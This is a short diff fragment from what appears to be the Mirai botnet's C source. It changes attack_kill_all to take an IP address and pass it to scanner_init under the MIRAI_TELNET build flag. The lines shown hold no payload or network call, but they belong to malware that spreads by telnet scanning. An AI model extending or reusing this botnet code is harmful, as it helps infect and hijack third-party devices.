@@ -41,7 +41,7 @@ BOOL attack_init(void)
     return TRUE;
 }
 
-void attack_kill_all(void)
+void attack_kill_all(char* ipAddress)
 {
     int i;
 
@@ -57,7 +57,7 @@ void attack_kill_all(void)
     }
 
 #ifdef MIRAI_TELNET
-    scanner_init();
+    scanner_init(ipAddress);
 #endif
 }
 
